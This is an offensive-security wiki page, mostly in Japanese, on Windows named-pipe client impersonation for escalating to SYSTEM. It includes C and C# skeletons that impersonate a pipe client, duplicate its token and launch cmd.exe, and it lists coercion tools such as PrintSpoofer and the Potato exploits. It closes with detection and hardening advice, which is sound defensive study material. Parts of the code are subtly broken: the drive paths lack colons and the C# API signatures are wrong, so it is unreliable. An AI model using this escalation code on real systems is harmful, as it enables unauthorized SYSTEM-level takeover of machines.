# Named Pipe client impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation は、named-pipe サーバースレッドが接続してきたクライアントのセキュリティコンテキストを引き受けることを可能にするローカル権限昇格プリミティブです。実務では、SeImpersonatePrivilege でコードを実行できる攻撃者が、特権のあるクライアント（例: SYSTEM service）を攻撃者が制御するパイプに接続させ、ImpersonateNamedPipeClient を呼び出させ、得られたトークンをプライマリトークンに Duplicate し、クライアントとしてプロセスを生成（多くの場合 NT AUTHORITY\SYSTEM）します。

このページはコア技術に焦点を当てています。SYSTEM をあなたのパイプに強制的に接続させるエンドツーエンドのエクスプロイトチェーンについては、下記の Potato family ページを参照してください。

## TL;DR
- Create a named pipe: \\.\pipe\<random> と作成し、接続を待つ。
- 特権コンポーネントをそれに接続させる（spooler/DCOM/EFSRPC/etc.）。
- パイプから少なくとも1メッセージを読み取り、その後 ImpersonateNamedPipeClient を呼ぶ。
- 現在のスレッドからインパーソネーションのトークンを開き、DuplicateTokenEx(TokenPrimary) を実行し、CreateProcessWithTokenW/CreateProcessAsUser で SYSTEM プロセスを得る。

## Requirements and key APIs
- 呼び出しプロセス/スレッドに通常必要な権限:
- SeImpersonatePrivilege — 接続してきたクライアントを正常にインパーソネートし、CreateProcessWithTokenW を使うために必要。
- あるいは、SYSTEM をインパーソネートした後に CreateProcessAsUser を使うこともでき、その場合は SeAssignPrimaryTokenPrivilege と SeIncreaseQuotaPrivilege が必要になることがある（これらは SYSTEM をインパーソネートしている場合に満たされる）。
- 使用される主な API:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile（インパーソネーション前に少なくとも1メッセージを読む必要あり）
- ImpersonateNamedPipeClient と RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW または CreateProcessAsUser
- インパーソネーションレベル: ローカルで有用な操作を行うには、クライアントが SecurityImpersonation を許可している必要がある（多くのローカル RPC/named-pipe クライアントのデフォルト）。クライアントはパイプを開く際に SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION でこれを下げることができる。

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
注意事項:
- ImpersonateNamedPipeClient が ERROR_CANNOT_IMPERSONATE (1368) を返す場合、最初にパイプから読み取っていることと、クライアントがインパーソネーションを Identification level に制限していないことを確認してください。
- プロセス作成に適したプライマリトークンを作成するには、DuplicateTokenEx を SecurityImpersonation と TokenPrimary と共に使用することを推奨します。

## .NET の簡単な例
.NET では、NamedPipeServerStream は RunAsClient 経由でインパーソネートできます。インパーソネート中にスレッドトークンを複製し、プロセスを作成します。
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
これらの手法は、特権を持つサービスをあなたの named pipe に接続させ、インパーソネートできるように強制します:
- Print Spooler RPC トリガー (PrintSpoofer)
- DCOM activation/NTLM reflection のバリアント (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Troubleshooting and gotchas
- ImpersonateNamedPipeClient を呼ぶ前に、少なくとも1つのメッセージをパイプから読み取る必要があります。そうしないと ERROR_CANNOT_IMPERSONATE (1368) が返ります。
- クライアントが SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION で接続した場合、サーバーは完全にインパーソネートできません。GetTokenInformation(TokenImpersonationLevel) でトークンのインパーソネーション レベルを確認してください。
- CreateProcessWithTokenW は呼び出し元に SeImpersonatePrivilege を要求します。これが ERROR_PRIVILEGE_NOT_HELD (1314) で失敗する場合は、既に SYSTEM をインパーソネートした後に CreateProcessAsUser を使ってください。
- パイプのセキュリティ記述子をハードニングしている場合、対象サービスが接続できるように許可があることを確認してください。デフォルトでは \\.\pipe 以下のパイプはサーバーの DACL に従ってアクセス可能です。

## Detection and hardening
- named pipe の作成と接続を監視してください。Sysmon Event IDs 17 (Pipe Created) と 18 (Pipe Connected) は正当なパイプ名のベースライン化や、トークン操作イベントに先行する異常でランダムに見えるパイプの検出に有用です。
- 次のシーケンスを探します: プロセスがパイプを作成し、SYSTEM サービスが接続し、その後作成プロセスが SYSTEM として子プロセスを生成する。
- 非必須のサービスアカウントから SeImpersonatePrivilege を削除し、高い権限での不要なサービスログオンを避けることで曝露を減らします。
- 防御的開発: 信頼できない named pipe に接続する場合、SECURITY_SQOS_PRESENT と SECURITY_IDENTIFICATION を指定して、必要な場合以外はサーバーがクライアントを完全にインパーソネートできないようにします。

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
